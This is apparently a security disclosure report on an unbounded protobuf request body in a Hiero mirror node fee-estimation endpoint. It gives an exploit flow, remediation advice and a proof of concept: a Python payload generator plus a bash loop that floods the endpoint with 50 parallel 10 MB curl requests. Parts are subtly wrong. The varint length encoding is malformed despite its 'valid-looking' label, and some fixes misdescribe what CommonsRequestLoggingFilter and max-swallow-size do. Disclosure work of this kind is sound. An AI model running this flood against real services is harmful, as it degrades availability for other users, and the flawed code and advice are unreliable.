### Title
Unbounded Protobuf Request Body Allocation in `estimateFees()` Enables GC-Pressure Griefing

### Summary
The `POST /api/v1/network/fees` endpoint in `NetworkController.estimateFees()` accepts a raw `byte[]` request body with no enforced size limit for `application/protobuf` content type. Any unauthenticated caller can repeatedly send requests at the maximum allowed body size, forcing the JVM to allocate a large `byte[]` on every request, driving heap pressure and frequent garbage collection pauses that degrade response latency for all concurrent users.

### Finding Description
**Exact code location:** `rest-java/src/main/java/org/hiero/mirror/restjava/controller/NetworkController.java`, lines 110–124.

```java
@PostMapping(
        consumes = {"application/protobuf", "application/x-protobuf"},
        value = "/fees")
FeeEstimateResponse estimateFees(
        @RequestBody @NotNull byte[] body,   // ← no @Size constraint
        ...
```

Spring's `ByteArrayHttpMessageConverter` reads the entire request body into a single `byte[]` before the method is invoked. There is no `@Size(max = …)` annotation on `body`, no `server.tomcat.max-swallow-size` / `server.tomcat.max-http-form-post-size` configuration in the module's resource directory (only `banner.txt` exists under `rest-java/src/main/resources`), and no rate-limiting bean in the `rest-java` module (all throttle infrastructure lives in the `web3` module).

**Why existing checks are insufficient:**

| Defense | Why it does not apply |
|---|---|
| `JacksonConfiguration` limits (`maxDocumentLength=1000`, etc.) | Applies only to JSON deserialization; this endpoint consumes `application/protobuf`, bypassing Jackson entirely. |
| Tomcat `maxPostSize` (default 2 MB) | Tomcat enforces this limit **only** for `application/x-www-form-urlencoded` POST bodies; protobuf content type is exempt. |
| `@NotNull` on `body` | Only rejects a missing body; does not bound its size. |
| `web3` `ThrottleManager` / `rateLimitBucket` | Scoped to the `web3` Spring application context; not wired into `rest-java`. |

**Exploit flow:**
1. Attacker sends `POST /api/v1/network/fees` with `Content-Type: application/protobuf` and a body padded to the maximum size the TCP stack / reverse proxy will forward (commonly 10–100 MB if no upstream limit is set).
2. Spring allocates a `byte[]` of that size on the heap for every request before any application logic runs.
3. Attacker repeats at high concurrency from multiple source IPs (no authentication, no per-IP rate limit in `rest-java`).
4. Heap fills with short-lived large arrays; the JVM enters frequent major GC cycles, causing stop-the-world pauses that increase latency for all endpoints served by the same process.

### Impact Explanation
The impact is availability degradation (griefing) with no economic damage to network users. GC stop-the-world pauses of hundreds of milliseconds to seconds are observable by all concurrent API consumers. Under sustained attack the service may become effectively unresponsive without crashing, making it harder to detect than an OOM. Severity is **Medium** consistent with the scope classification.

### Likelihood Explanation
No privileges, credentials, or special knowledge are required. The endpoint is publicly documented in the OpenAPI spec (`rest/api/v1/openapi.yml`, lines 916–947). A single attacker with a modest bandwidth connection can sustain the attack. The absence of any per-IP or global request-rate limit in `rest-java` means the attack is trivially repeatable and automatable.

### Recommendation
Apply a defense-in-depth combination:

1. **Enforce a maximum body size at the Spring/Tomcat layer** for non-form content types by adding to the application configuration:
   ```yaml
   server:
     tomcat:
       max-swallow-size: 65536   # reject bodies > 64 KB after response is sent
   ```
   and registering a `CommonsRequestLoggingFilter` or a custom `OncePerRequestFilter` that rejects requests whose `Content-Length` exceeds the expected maximum protobuf transaction size (Hedera transactions are bounded at ~6 KB for standard transactions).

2. **Add a `@Size` or custom constraint on `body`** (e.g., `@Size(max = 6144)`) so Bean Validation rejects oversized bodies before `ByteArrayHttpMessageConverter` materialises the full array. Note: this requires a custom `HttpMessageConverter` that checks size before buffering.

3. **Add rate limiting to the `rest-java` module** mirroring the `web3` `ThrottleConfiguration` pattern, scoped to `POST /api/v1/network/fees`.

### Proof of Concept
```bash
# Generate a 10 MB body of valid-looking protobuf framing (field 1, length-delimited)
python3 -c "
import sys, struct
payload = b'\x00' * (10 * 1024 * 1024)
# protobuf field 1, wire type 2 (length-delimited)
tag = b'\x0a'
length = struct.pack('B', 0x80 | (len(payload) & 0x7f)) + \
         struct.pack('B', (len(payload) >> 7) & 0x7f)
sys.stdout.buffer.write(tag + length + payload)
" > /tmp/large_proto.bin

# Flood the endpoint from multiple parallel connections
for i in $(seq 1 50); do
  curl -s -o /dev/null \
    -X POST http://<host>:8084/api/v1/network/fees \
    -H 'Content-Type: application/protobuf' \
    --data-binary @/tmp/large_proto.bin &
done
wait
